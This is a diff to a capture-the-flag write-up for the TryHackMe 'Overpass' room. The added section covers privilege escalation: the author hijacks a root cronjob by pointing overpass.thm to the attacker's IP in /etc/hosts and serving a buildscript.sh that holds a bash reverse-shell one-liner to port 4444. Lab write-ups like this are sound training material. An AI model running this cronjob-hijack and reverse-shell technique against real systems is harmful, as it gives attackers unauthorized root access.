@@ -58,7 +58,7 @@ Don't forget to change the file permissions to 600 or ssh will complain.
 We're in! The user flag is the usual location and should be easy to find. Let's to try escalate our privilege.
 
 sudo -l does not give us anything.
-Maybe there's an interesting file with SUID permission?
+Perhaps there's an interesting file with SUID permission?
 
 ![suid](/thm/images/overpass/suid.png)
 
@@ -67,3 +67,19 @@ Again nothing we can use.
 Let's check if we can exploit a cronjob.
 
 ![cronjob](/thm/images/overpass/cronjobs.png)
+
+We can see there's a buildscript.sh run from overpass.thm/downloads/src. If we can edit /etc/hosts I can set overpass.thm to my IP and get root privilege with a reverse shell.
+
+First we edit /etc/hosts and put our own IP in.
+![etchosts](/thm/images/overpass/etchosts.png)
+
+Then we go back our own machine and create the exact same folders: downloads/src
+
+```
+mkdir -p downloads/src
+```
+Create a buildscript.sh in the src folder and put the reverse shell in there
+
+```
+bash -i >& /dev/tcp/<your_ip>/4444 0>&1
+```
